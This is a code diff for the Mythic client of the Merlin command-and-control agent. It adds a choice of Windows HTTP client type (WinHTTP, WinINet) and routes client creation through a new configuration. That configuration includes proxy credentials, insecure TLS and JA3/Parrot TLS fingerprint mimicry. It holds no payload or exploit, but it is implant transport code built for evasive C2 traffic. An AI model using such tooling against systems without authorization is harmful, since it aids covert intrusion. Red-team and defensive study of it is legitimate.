@@ -58,6 +58,7 @@ import (
 	rsaAuthenticaor "github.com/Ne0nd0g/merlin-agent/v2/authenticators/rsa"
 	"github.com/Ne0nd0g/merlin-agent/v2/cli"
 	"github.com/Ne0nd0g/merlin-agent/v2/core"
+	merlinHTTP "github.com/Ne0nd0g/merlin-agent/v2/http"
 	"github.com/Ne0nd0g/merlin-agent/v2/http/utls"
 	"github.com/Ne0nd0g/merlin-agent/v2/services/agent"
 	transformer "github.com/Ne0nd0g/merlin-agent/v2/transformers"
@@ -80,10 +81,11 @@ var mythicSocksConnection = sync.Map{}
 // Client is a type of MerlinClient that is used to send and receive Merlin messages from the Merlin server
 type Client struct {
 	Authenticator authenticators.Authenticator
-	authenticated bool                      // authenticated tracks if the Agent has successfully authenticated
-	AgentID       uuid.UUID                 // TODO can this be recovered through reflection since client is embedded into agent?
-	MythicID      uuid.UUID                 // The identifier used by the Mythic framework
-	Client        *http.Client              // Client to send messages with
+	authenticated bool              // authenticated tracks if the Agent has successfully authenticated
+	AgentID       uuid.UUID         // TODO can this be recovered through reflection since client is embedded into agent?
+	MythicID      uuid.UUID         // The identifier used by the Mythic framework
+	Client        merlinHTTP.Client // Client to send messages with
+	ClientType    merlinHTTP.Type
 	Protocol      string                    // The HTTP protocol the client will use
 	URL           string                    // URL to send messages to (e.g., https://127.0.0.1:443/test.php)
 	Host          string                    // HTTP Host header value
@@ -116,6 +118,7 @@ type Config struct {
 	Padding      string    // Padding is the max amount of data that will be randomly selected and appended to every message
 	InsecureTLS  bool      // InsecureTLS is a boolean that determines if the InsecureSkipVerify flag is set to true or false
 	Transformers string    // Transformers is an ordered comma seperated list of transforms (encoding/encryption) to apply when constructing a message
+	ClientType   string    // ClientType is the type of WINDOWS http client to use (e.g., WinINet, WinHTTP, etc.)
 }
 
 // New instantiates and returns a Client constructed from the passed in Config
@@ -142,10 +145,12 @@ func New(config Config) (*Client, error) {
 	}
 
 	// Get the HTTP client
-	client.Client, err = getClient(client.Protocol, client.Proxy, client.JA3, client.Parrot, client.insecureTLS)
-	if err != nil {
-		return &client, err
-	}
+	/*
+		client.Client, err = getClient(client.Protocol, client.Proxy, client.JA3, client.Parrot, client.insecureTLS)
+		if err != nil {
+			return &client, err
+		}
+	*/
 
 	// Set PSK
 	client.psk, err = base64.StdEncoding.DecodeString(config.PSK)
@@ -213,9 +218,54 @@ func New(config Config) (*Client, error) {
 		cli.Message(cli.WARN, fmt.Sprintf("there was an error converting Padding string \"%s\" to an integer: %s", config.Padding, err))
 	}
 
+	// Determine the HTTP client type
+	if client.Protocol == "http" || client.Protocol == "https" {
+		if config.ClientType == strings.ToLower("winhttp") {
+			client.ClientType = merlinHTTP.WINHTTP
+		} else if config.ClientType == strings.ToLower("wininet") {
+			client.ClientType = merlinHTTP.WININET
+		} else {
+			client.ClientType = merlinHTTP.HTTP
+		}
+	}
+
+	if client.Protocol == "h2" || client.Protocol == "h2c" {
+		client.ClientType = merlinHTTP.HTTP2
+	}
+
+	if client.Protocol == "http3" {
+		client.ClientType = merlinHTTP.HTTP3
+	}
+
+	// If JA3 or Parrot was set, override the client type forcing HTTP/1.1 using the uTLS client
+	if client.JA3 != "" {
+		client.ClientType = merlinHTTP.JA3
+	} else if client.Parrot != "" {
+		client.ClientType = merlinHTTP.PARROT
+	}
+
+	// Build HTTP client config
+	httpConfig := merlinHTTP.Config{
+		ClientType: client.ClientType,
+		Insecure:   client.insecureTLS,
+		JA3:        client.JA3,
+		Parrot:     client.Parrot,
+		Protocol:   client.Protocol,
+		ProxyURL:   client.Proxy,
+		ProxyUser:  client.ProxyUser,
+		ProxyPass:  client.ProxyPass,
+	}
+
+	// Get the HTTP client
+	client.Client, err = merlinHTTP.NewHTTPClient(httpConfig)
+	if err != nil {
+		return &client, err
+	}
+
 	cli.Message(cli.INFO, "Client information:")
 	cli.Message(cli.INFO, fmt.Sprintf("\tMythic Payload ID: %s", client.MythicID))
 	cli.Message(cli.INFO, fmt.Sprintf("\tProtocol: %s", client.Protocol))
+	cli.Message(cli.INFO, fmt.Sprintf("\tHTTP Client Type: %s", client.ClientType))
 	cli.Message(cli.INFO, fmt.Sprintf("\tAuthenticator: %s", client.Authenticator))
 	cli.Message(cli.INFO, fmt.Sprintf("\tTransforms: %+v", client.transformers))
 	cli.Message(cli.INFO, fmt.Sprintf("\tURL: %s", client.URL))
